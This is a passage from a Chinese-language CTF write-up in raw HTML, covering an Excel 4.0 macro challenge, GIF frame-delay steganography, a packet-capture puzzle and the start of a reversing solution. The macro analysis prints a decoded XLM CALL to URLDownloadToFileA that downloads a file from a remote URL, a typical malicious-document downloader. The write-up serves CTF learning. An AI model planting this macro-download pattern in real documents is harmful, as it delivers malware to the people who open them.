operator">&amp;</span>coCGA<span class="token operator">!</span>G18<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>V1<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>O26<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>G5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>H22<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>W17<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F8<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>L15<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>H3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U17<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>BA11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>F14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B10<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V12<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U12<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P14<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Y1<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>B10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F16<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q26<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I26<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>L15<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>G2<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I18<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>M4<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C7<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>N5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>J9<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I7<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G13<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M12<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>X2<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>M1<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>P3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>S12<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D16<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P17<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I5<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W24<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E10<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B8<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>C14<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Z15<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>F19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z2<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D13<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O2<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>D19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>K19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U20<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q9<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I17<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X17<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q24<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N21<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W11<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E17<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>H19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>X6<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N18<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q17<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>J25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z16<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P13<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z21<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>C24<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O21, A137<span class="token punctuation">)</span>
</code></pre>
<p>在 Microsoft 的文章(<a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-tw/office/%E5%B0%87%E5%85%A9%E5%80%8B%E6%88%96%E5%A4%9A%E5%80%8B%E5%84%B2%E5%AD%98%E6%A0%BC%E5%85%A7%E7%9A%84%E6%96%87%E5%AD%97%E5%90%88%E4%BD%B5%E8%87%B3%E4%B8%80%E5%80%8B%E5%84%B2%E5%AD%98%E6%A0%BC-81ba0946-ce78-42ed-b3c3-21340eb164a6">將兩個或多個儲存格內的文字合併至一個儲存格</a>) 中可以看到合併文字的方法 : 利用 <code>&amp;" "&amp;</code>連接儲存格位置(善用搜尋取代)</p>
<pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span>mqLen<span class="token operator">!</span>D14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>S17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Q19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>L19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>O23<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>K12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>E4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>T5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>K10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>W1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>C12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>Y19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>N21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>N1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>S2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>D16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>U26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>R1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>R11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>U10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>V1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>O26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>G5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>H22<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>W17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F8<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>L15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>H3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>BA11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>F14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Y1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>B10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>L15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>G2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>M4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>N5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>J9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>X2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>M1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>P3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>S12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B8<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>C14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Z15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>F19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>D19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>K19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U20<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>H19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>X6<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>J25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>C24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O21
</code></pre>
<p>就可以得到下列的結果，把 space 去掉後就有 flag 了</p>
<pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span> C A L L <span class="token punctuation">(</span> <span class="token string">" u r l m o n "</span> , <span class="token string">" U R L D o w n l o a d T o F i l e A "</span> , <span class="token string">" J J C C B B "</span> , 0 , <span class="token string">" h t t p : / / a i s 3 . o r g / ? A I S 3 { X L M _ i S _ t o 0 _ o 1 d _ b u t _ c o 0 o 0 o 0 0 o l l l ! ! } "</span> , <span class="token string">" . \ ~ t m p . t x t "</span> , 0 , 0 <span class="token punctuation">)</span>
</code></pre>
<p>Flag <code>AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}</code></p>
<h3 id="Gift-in-the-dream"><a href="#Gift-in-the-dream" class="headerlink" title="Gift in the dream"></a>Gift in the dream</h3><p>下載後得到一個 gif，先看一下詳細的內容<br><code>exiftool gift_in_the_dream_updated.gif</code></p>
<p><img src="https://i.imgur.com/vJLD5fs.png"></p>
<p>從 comment 看到 <strong>why is the animation lagging? why is the duration so weird? is this just a dream?</strong><br>猜想跟時間間隔有關係，因此用 <code>identify</code> 去看，發現第一個間隔(65)很眼熟(‘A’)，於是將每個間隔當成 ascii 換成 chr<br><code>identify -format "%T " gift_in_the_dream_updated.gif</code><br><img src="https://i.imgur.com/F8iQrEy.png"></p>
<pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre>
<p>Flag <code>AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}</code></p>
<h3 id="Knock"><a href="#Knock" class="headerlink" title="Knock"></a>Knock</h3><p><img src="https://i.imgur.com/txe3jYP.png"><br>將 token 輸入後會得到<br><img src="https://i.imgur.com/ik2HmRj.png"><br>用 Wireshark 去錄 Knock 後出現的東西，一樣看到了眼熟的<code>65</code>(<code>A</code>)，於是將數字當成 ascii 換成 chr<br><img src="https://i.imgur.com/b5dwczl.png"></p>
<pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre>
<p>Flag <code>AIS3{kn0ckKNOCKknock}</code></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a>Time Management</h3><p>IDA Pro 看一下 main</p>
<p><img src="https://i.imgur.com/tyatVhK.png"></p>
<p>我們有 <code>secret[]</code> 和 <code>key[]</code>，所以只要照著把 <code>v4</code> 推出來就可以了</p>
<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> secret<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">861096257</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1869572219</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1601790322</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1769108595</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1601398638</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1633645417</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2036430700</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1851875187</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1702065503</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1600943462</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1835888483</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2103733857</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">973148161</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">822358554</span><span class="token punctuation">,</span><span class="token number">4542272</span><span class="token punctuation">,</span><span class="token number">69014578</span><span class="token punctuation">,</span><span class="token number">973799469</span><span class="token punctuation">,</span><span class="token number">203030572</span><span class="token punctuation">,</span><span class="token number">222171395</span><span class="token punctuation">,</span><span class="token number">739379761</span><span class="token punctuation">,</span><span class="token number">436220160</span><span class="token punctuation">,</span><span class="token number">1280056077</span><span class="token punctuation">,</span><span class="token number">1043142173</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> res<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">23</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
        res <span class="token operator">=</span> secret<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>secret<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
